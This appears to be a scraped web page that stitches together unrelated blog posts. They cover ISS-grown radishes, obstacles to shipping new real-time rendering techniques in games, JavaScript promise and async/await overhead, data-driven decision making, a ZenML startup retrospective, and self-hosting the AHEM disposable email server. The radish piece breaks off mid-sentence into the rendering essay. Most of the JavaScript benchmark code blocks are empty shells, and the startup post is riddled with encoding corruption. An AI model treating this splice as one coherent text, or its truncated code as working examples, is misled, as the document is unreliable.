						<p>The thought of eating "astronaut food" brings to mind a kind of instant food that is far from "farm to table." However, recent experiments aboard the ISS are improving our understanding of how to bring the farm directly into space itself.</p><p>Astronauts just ran a Veg-PONDS 02 experiment on the International Space Station. The experiment used food that was cultivated in space.

The radish sprouts will be sent back to Earth early next year on SpaceX's 22nd Commercial Resupply Services mission, NASA announced.</p><figure><img src="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Rzodkiewka " srcset="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jo_lanta?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jo Lanta</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Radishes, a well-known fresh vegetable, were chosen for the Plant Habitat-02 experiment because vegetables are well understood by scientists.

<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>

    </span></p>
<p>JavaScript as a language is heavily asynchronous, with promises being deeply integrated. The inclusion of async/await syntax has massively improved this, making asynchronous code much more readable. Being able to mark methods as async makes it much easier to integrate into existing parts of code, sometimes causing large chains of method calls to become async for a single deep method call. While this is sometimes the best solution, can the overhead of promises pose a problem for hot code?</p>
<h3 id="benchmarks"><a href="#benchmarks" aria-label="benchmarks permalink"></a>Benchmarks</h3>
<p>As of writing, the v8 JavaScript engine that powers both Chromium and NodeJS does not optimise out redundant promises. Due to this, a decent benchmark to determine just the overhead of promises is to take a typical function call and make it a promise. For this case, I'm using a function that calculates a position in the Fibonacci sequence.</p>
<h4 id="test-1---recursive-fibonacci"><a href="#test-1---recursive-fibonacci" aria-label="test 1   recursive fibonacci permalink"></a>Test 1 - Recursive Fibonacci</h4>
<p>The first test is using a recursive Fibonacci function. Using a recursive function as a test case here means we will get a compounding overhead from the promises. This result will show us a relatively worse case example.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>

<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/jrkj8dqar8/1">JSBench.Me</a>, the promise case is shown to be <strong>86% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>While this is an unrealistic case, it shows that promises can significantly impact performance, especially in hot code paths.</p>
<h4 id="test-2---non-recursive-fibonacci"><a href="#test-2---non-recursive-fibonacci" aria-label="test 2   non recursive fibonacci permalink"></a>Test 2 - Non-Recursive Fibonacci</h4>
<p>A non-recursive Fibonacci sequence shows what sort of overhead a low-cost method call could have to get a more real-world view. In this case, each call to the function will only have the overhead of a single promise.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>

  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>

<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/1dkj8e6n54/1">JSBench.Me</a>, the promise case is shown to be <strong>81% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>This result shows that adding an async modifier to the method can almost double the time it takes to execute simple functions. For hot code, this could make a significant difference.</p>
<h4 id="test-3---promise-vs-asyncawait"><a href="#test-3---promise-vs-asyncawait" aria-label="test 3   promise vs asyncawait permalink"></a>Test 3 - Promise vs Async/Await</h4>
<p>So we've seen what just adding the async keyword can do, but what if we use promises directly instead?</p>
<p>Using async code from the previous test case, and the following code,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>return</span> <span>new</span> <span>Promise</span><span>(</span><span>(</span><span>resolve<span>,</span> reject</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/3jkj8ekl0r/1">JSBench.Me</a>, the case using promises rather than async/await is shown to be a further <strong>26% slower</strong> on Chrome 87 than the async/await case.</p>
<h3 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h3>
<p>There are a few potential solutions for this issue. Firstly, however, it's important to point out that unless you've confirmed a section of code to be causing performance issues, you don't need to optimise it. Once you've used a profiler to verify that it's worth optimising a piece of code, then it's worth investigating.</p>
<p>The simplest solution here is to perform data fetching or other asynchronous operations closer to the application's root and pass the resulting data down. Often program structures that involve deep-nested async/await paths exhibit poor separation of concerns. Ideally, a single system should not load and use data; instead, it should receive the data from another system that loads it. This structure also has the added benefit of being much more testable. Doing this should prevent the need to nest async/await methods deeply.</p>
<p>Another option is to only use the async keyword for the inner-most method if possible. Each method with an async keyword adds overhead, so if you can work with the promise directly outside of that function, you're not introducing further overhead. This technique can be even more helpful when the method only sometimes needs to return a promise. In this case, including the async keyword introduces the overhead always. If you return a promise directly, overhead (albeit slightly more overhead) happens only a portion of the time.</p>
<h3 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h3>
<p>Promises and Async/Await introduce measurable overhead into JavaScript code. This problem can be worked around in most cases when necessary, yet, it will not pose any issue most of the time. As with most things, understanding the various trade-offs in performance is essential when optimising code. If you've identified a hot code path that makes heavy use of async/await, it may be worth investigating ways to minimise that.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In the modern business environment everyone wants to be data-driven. You can hear the envy in a conference room when a good graph hits the audience right in their data-loving brains. Data is good. Data rules all.</p>

<p>What you see less are the glaring imperfections in most data. The show must go on - fine-grained analysis of the data used for strategic decisions holds up things up. Deep dives into data require ability to get that data, interpret that data, and understand that data. This creates a power imbalance where the data-creator is much better positioned to tell the story they want to tell; the data-consumer is hard-pressed to disagree with that story in real-time. Alas, decisions happen in conference rooms, data analysis happens at a desk.</p>

<p>These two realities are Saasy’s Axioms of Data:</p>
<ul>
  <li>Data wins arguments. Imperfect data beats no data.</li>
  <li>All data is imperfect.</li>
</ul>

<p>These realities have 3 major implications for how you should approach getting things done:</p>
<ul>
  <li>Show up with data.</li>
  <li>Use data as a compass, not a map.</li>
  <li>Beware the abuse of data.</li>
</ul>

<h2 id="show-up-with-data">Show Up With Data</h2>

<p>Most of the time some data is better than no data. You should strive to be data-driven. Our collective admiration of data comes from a reasonable instinct.</p>

<p>In a world where data is useful and people view it as a sign of mature, rational, and thorough work, you should show up with data. No matter your role, you will get more of the things you want and do a better job if you show up with data.</p>

<p>As many have pointed out, you can measure anything to get data for your case:</p>
<ul>
  <li>Our team cycle time decreased by 20% last half on repos that were converted to using React and remained constant on ones that weren’t. We should convert the remainder of our repos to React.</li>
  <li>We left 290 style comments on pull requests in the last quarter. If each of those take 2 minutes to resolve on average, replacing that mechanism with an automatic enforced style-guide will save us a full day per quarter.</li>
  <li>Only 5% of IT requests take longer than 1 week, but those that do take an average 3 months. Those tickets also are responsible for the majority of internal-NPS for the IT team below a 4. We need to implement a process to get rid of these outliers.</li>
</ul>

<p>All of these arguments are more compelling because they are data-supported. The data is imperfect, but it’s useful. It gives an overall, high-level assessment of the situation. It also allows for measurement of results, using the same data after the change.</p>

<p>If you’re not using data regularly you’re probably leaving a lot of impact on the floor, no matter if you’re a new IC right out of college or a seasoned executive. Show up with data.</p>

<h2 id="data-is-a-compass-not-a-map">Data Is A Compass, Not A Map</h2>

<p>Data exists to help you understand, at a high level, what would be useful to do and how effective your actions have been. However, the more granular the decisions are, the less useful data becomes. Data’s utility is strongest when it tells a clear story, not when it whispers details. So you should use data more when the data is very clear and makes sense, and you should rely on it less when it’s more nuanced.</p>

<p>For example, employee satisfaction surveys provide useful data when the signal is clear and blunt: people are unhappy or people are happy. The surveys are less useful when it comes to specific feedback. A sole comment about the espresso machine might say that it’s too loud. If you then move the machine to the hallway, you might find that 90% of your team hates the new location because it’s farther away. You used the data like a set of instructions, not a broad picture.</p>

<p>Another example: I had a feeling awhile back that remote candidates were turning down our offers more than local candidates. I pulled the data and the story was clear - remote candidates actually closed at a significantly higher rate than local candidates. The data was imperfect, but it gave no credence to my assumption, and I had other ways I can improve recruiting so I moved on.</p>

<p>In the compass analogy: I thought I was heading South, but my compass told me I was heading North. I might have actually been going NorthWest, but I’m happy enough to know that I’m not going South.</p>

<p>You might think that the advocacy to use data when it’s bold and intuitive is a catch-22, that data is most useful when it’s counter to your intuition and changes your behavior. However, I disagree - data is most often important in two cases: 1) it provides direction when you have no prior intuition at all and 2) it sets you up to measure the success of your work from the get-go.</p>

<h2 id="beware-the-abuse-of-data">Beware The Abuse Of Data</h2>

<p>Because data is powerful and imperfect, and because decisions are using presented data and not data-analysis, there are many who would wield its power without prudence. You can see these people show up with hand-crafted data any time they want to get their way. And because it can seem petty and defensive to question that data - after all, you’d be the amateur who didn’t show up with data - those people can often get their way, even when the data isn’t bold and the conclusions are debatable.</p>

<p>There’s no one-size-fits-all solution to these situations. High level though, I’d recommend the following:</p>
<ul>
  <li>Work to ensure your company has a healthy data culture</li>
  <li>Show up with data for the things you really care about</li>
</ul>

<p>First, a healthy data culture uses data but understands its limitations. A healthy data culture is a humble data culture. If data is moving you towards good decisions with clear signals and helps you measure success, that’s great. If data is wielded as a weapon or is paraded around as a sign of greatness, watch out.</p>

<p>For an example of a bad data culture, your no-assholes-allowed company might put up with a salesperson because “they put up crazy numbers”. Indeed, that person might wear their quarterly numbers like a badge that lets them behave on a different plane of existence. However, are you tracking how often they are making concessions with negative downstream impacts? Are you tracking how much time they take from the rest of the organization to support their sales? This is to say nothing of the culture impact of that person.</p>

<p>The nuance here is important. Their quarterly numbers tell a clear story - they sell a lot of product. But the question was more nuanced: should we put up with their behavior? In reality, you likely have almost no data that quantifies the totality of their impact on the company. Their sales are just one number in a complex ecosystem.</p>

<p>In this example, you used imperfect data to let you do something you wouldn’t otherwise. You made data a king and ended up being ruled by a tyrant.</p>

<p>Second, if you really care about something, considering showing up with data. Otherwise, you’ll be at a disadvantage if someone else does.</p>

<h2 id="summary">Summary</h2>

<p>Data, like any power, should be wielded with respect, humility, and caution. However, unlike most power, you should be wielding it regularly.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>As this is the end of the year, itâ€™s a great chance to remind yourself: how did we get here?</p>

<p>Let me beginn with a flashback to 2019. As a company, weâ€™re focussed on optimising remaining useful live of industrial assets through clever use of Machine Learning for predictive analysis, root-cause analysis and other forms of reasoning. We managed to secure a few big projects and very promising POCs, and across the board we were able to show good results. One of our projects even got government funding, providing a nice runway going forward.</p>

<p>We got the traditionally lengthy sales cycles with many leading industry players started, and we even hired our first full-time employee.</p>

<p>All was set up for first commercial success of our approach and our â€œasset optimisation platformâ€� in 2020.</p>

<p>Then the pandemic hit. Within a few weeks, all our sales leads fizzled away - millions of euros in deal sizes, disappeared in thin air. By March, we were looking at an empty sales funnel.</p>

<p>We had find a new path. We took stock, and we acted entrepreneurial.</p>

<h2 id="a-look-at-what-weve-got">A look at what weâ€™ve got</h2>

<p>Taking stock of what we actually had, in terms of intellectual property, was a great recap of our journey so far <a href="https://www.youtube.com/watch?v=UDfxoKmc8qc">(if youâ€™re interested, check out a talk I recently gave on what we learned about ML pipelines)</a>. To summarise, we had to our name:</p>

<ul>
  <li>A great team (experienced ML engineers, Ops expertise and a good entrepreneurial fit)</li>
  <li>A purpose-built tech stack for reproducible ML pipelines</li>
  <li>Experience running small and large projects</li>
  <li>A good network of other startups and developers in ML-related positions across the globe</li>
</ul>

<h2 id="talking-to-people">Talking to people</h2>

<p>We saw the economic effects of the pandemic very early - at least from an european perspective. After taking close stock, we had to understand how (and if) Machine Learning would continue to play a role for our leads and network. Taking a page out of the great UX researchers Iâ€™ve had the chance to work with over my career, we decided to do user interviews. Lo and behold, after doing ~30 early interviews, a picture emerged.</p>

<p>Teams engaged in ML projects lost significant chunks of time on unrepeatable projects as well as managing dysfunctional franken-infrastructures. Teams not yet engaged in ML feared it to be a black hole for time and effort to build up a reliable tech stack for getting experiments into production, as existing systems would need integration at many stages of the ML lifecycle.</p>

<p>An interesting side-fact became clear to us, too: there was a lot of scepticism towards ML-based SaaS products, but a lot of trust towards dev-tooling.</p>

<p>More importantly, however - we had solved exactly the problems our interviewees faced for ourselves. We were sitting on something commercially relevant, and we were looking at a great opportunity.</p>

<h2 id="understanding-your-market-part-one">Understanding your market, part one</h2>

<p>With this new-found confirmation we set out to transform our tech-stack from internal-facing supportive tooling to an actual product. Looking at the market, a split was noticeable.</p>

<p>On the one side, open-source tooling like Kubeflow and MLFlow was solving aspects of the MLOps problem space, but posed significant investments to the teams we were talking to in our interviews. Tooling was either missing the point of Data Scientists, or alienated product leads and DevOps teams with convoluted, messy or badly documented paths from experiment to production.</p>

<p>On the other side were very expensive commercial solutions, attempting to solve large chunks of the ML lifecycle with proprietary offerings.</p>

<h2 id="commercial-first">Commercial-first</h2>

<p>Given the layout of the MLOps market, we spotted an opportunity to flip the proverbial table. Donâ€™t get me wrong, weâ€™re not radical geniuses, we much rather are interested observers of entrepreneurial trends. Given the success of Stripe, Segment and others, this constellation of players screamed â€œtransactional business modelâ€� to us. A managed MLOps platform to train models easily in various public clouds, at linearly scaling prices, based on actual usage, not arbitrary license models or per-seat, and at a fraction of the going rates.</p>

<h2 id="understanding-the-market-part-two">Understanding the market, part two</h2>

<p>By now we know: Our hypothesis, teams are just waiting for a managed MLOps solution with usage-based pricing and reproducible pipelines as focus, was off. This was not immediately clear to us, of course.</p>

<p>One of our smartest plays saved us in the end - we never stopped doing user interviews. We demoâ€™ed our product status quo multiple times per week, we had two soft-launches and continuously engaged with the community on conferences, reddit, slack - you name it.</p>

<p>And people loved our take on MLOps. Our vision resonated deeply. All model trainings are guaranteed to be reproducible, tracking is deeply baked-in, integrations to popular tooling are easy and extensible - these are the key concerns of the teams we were talking to.</p>

<p>However, it would have been ludicrous to switch their tech-stacks to a commercial solution. No, if we wanted to drive adoption and actually have an impact on how the world dealt with MLOps, we had to give these teams the option to adopt our vision in their projects on their own terms. We had to open-source.</p>

<p>As Iâ€™ve written in the past, <a href="http://blog.maiot.io/open-source">we are huge proponents of open-source software</a>. Large parts of our own tooling would be possible without the work of open-source giants, on whose shoulders we can stand.</p>

<h2 id="the-jury-is-still-out">The jury is still out</h2>

<p>As of writing this, the jury is still out if weâ€™re leaving the dent in the universe that we want to leave behind. But, and this is a hugely rewarding feeling, we have all the right indications that we nailed it this time. Weâ€™ve breached 200 GitHub stars in less than a week of going public, weâ€™ve been on the front page of Hackernews, weâ€™ve been trending on GitHub, and ZenML is racing to 1000 <code>pip install</code>â€™s.</p>

<p>If youâ€™re running ML projects, or just personally got curious, head over to <a href="https://github.com/maiot-io/zenml">ZenMLâ€™s GitHub page</a> and get started with reproducible Machine Learning!</p>

            <div>
                <div>
                                                                                <p><img src="https://neilzone.co.uk/content/images/20201227164320-Screenshot%202020-12-27%20at%2016.42.25.png" alt="Screenshot of webpage showing AHEM email service"></p>

<p>I've run my own mailserver for years now, with a <em>catch-all</em> on some domains.</p>

<p>This means that, whenever a shop or service asks for my email address, I can give them a unique address, specific to them, without needing to configure anything.</p>

<p>This has a number of uses, but the main ones for me are:</p>

<ul>
<li>if their system is compromised, my email address is of no use for credential stuffing attacks (since it is used only for that one site/service)</li>
<li>if I get spam from which I cannot unsubscribe, I can kill that email address without disrupting anything else</li>
<li>if they leak or sell my email address, and someone else uses it, I can tell</li>
</ul>

<p>One thing this setup does not do well, though, is deal with the situation in which I want a disposable email address: an email address which exists long enough to receive one email.</p>

<p>That's because, once I've given someone their unique address, they can continue sending to it, and it will continue to funnel their email into my mailbox, until I take action to stop them.</p>

<p>Sometimes, I want — well, am forced — to give over an email address just to access something. (For example, I wanted to download a cycle map from Sustrans the other day, and they insisted on having an email address, which is nonsensical as they just emailed me a link to a PDF on their website. Why not just hyperlink the PDFs from the website, and skip the hassle?! (Spoiler: probably some kind of tracking.).)</p>

<p>In that kind of situation, I want a system for disposable email addresses, which exist only for a very short period of time, and which do not clog up my mailbox.</p>



<p>There are loads of services which offer this, some free and some paid, and, to date, I've just used one of those. Since I've not used them for anything private, it didn't matter too much to me that someone else can see the content of the email.</p>

<p>Indeed, if you are looking for privacy from "hiding in a crowd", using a third party service is probably <em>preferable</em> to hosting your own service.</p>

<p>However, that trade-off was acceptable to me, and since I prefer to host my own tools, having my own setup seemed like a useful thing to have, if it was relatively easy to do.</p>

<p>And it was.</p>

<p>Relatively.</p>



<p>It took me about 30 minutes to get a disposable email server running using <a href="https://github.com/o4oren/Ad-Hoc-Email-Server">AHEM</a>.</p>

<p>The instructions on github sort of worked, and I can't tell if the bits which did not work out of the box are because of my lack of familiarity with node.js, or incomplete / no longer accurate instructions. Let's assume it's my ignorance!</p>

<p>I had a bit of a fight with angular, to make the project build, and I solved the error message by forcibly installing a particular version of it. Not ideal, but it worked.</p>

<p>After that, it built with some warnings but no more errors.</p>



<p>Since it's an email service, you need to set an MX record for the domain you want to use, pointing to a record pointing to the IP address on which you're running AHEM.</p>

<p>I chose a sub-domain of my normal domain. I'm using it for both the email addresses, and also for accessing the web server (via nginx).</p>

<p>AHEM can support multiple email domains, so if I wanted to do the same for one of Sandra's domains, it would be a simple case of adding the domain to AHEM's .env file.</p>



<p>I can understand why people do it, but it bugs me all the same: why use static files hosted by a third party CDN, rather than just hosting them yourself?</p>

<p>Out of the box, AHEM uses some JavaScript resources hosted on Cloudflare. I used wget to download the scripts, and then replaced the references in index.html with localhost references instead.</p>

<p>Bingo.</p>



<p>By default, it runs on localhost:3000. Fine for testing, but not what I wanted permanently.</p>

<p>Since I had nginx on the server already, reverse-proxying to give a web interface over port 80, using the same sub-domain as for the email address itself (although anything else would work too; they are not connected) was easy.</p>

<p>It also meant that it was trivial (using certbot) to pop a TLS certifcate on the proxy, giving me TLS over 443. Even though the web interface will be firewalled off and accessible only without our private network, I'd prefer to have TLS in place anyway.</p>

<p>I'm not sure why, but the basic config was 404'ing traffic to /socket.io/, so I added a specific <em>Location</em> section for that:</p>

<pre><code>location /socket.io/ {
    proxy_pass http://localhost:3000;       
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "Upgrade";
    proxy_set_header Host $host;
}
</code></pre>



<p>I'm not that familiar with node.js, so there might be a better way of doing this, but I was struggling to keep it running when I closed my ssh connection.</p>

<p>I could just run it as a background process (by appending &amp; to the command), but I installed  pm2:</p>

<pre><code>npm install pm2 -g
</code></pre>

<p>and then ran it using:</p>

<pre><code>pm2 start ahem.js
</code></pre>



<p>Now, I have a simple to use, self-hosted, web page, which lets me generate random email addresses to paste into webforms when I want a disposable address.</p>

<p>I need to refresh the page to check if an email has arrived, but that's fine. I should check if there's something I've not configured correctly, as I'd have thought it would refresh periodically, if nothing fancier existed to show an email when it arrives.</p>

<p>Email are deleted automatically when they are 24 hours old; again, this is something configurable via .env, but that seems fine as a default.</p>



<p>A couple of weeks ago, AHEM <a href="https://github.com/o4oren/Ad-Hoc-Email-Server/pull/41/commits/4c4bc7fb34a056ff47abc96d32c066023d7c7e37">changed its licence</a> from an in-house job to Apache 2.0.</p>

<p>This is a good decision, IMHO, but still needs to be reflected in the AHEM interface, since this says that it's only "available for personal and internal use".</p>

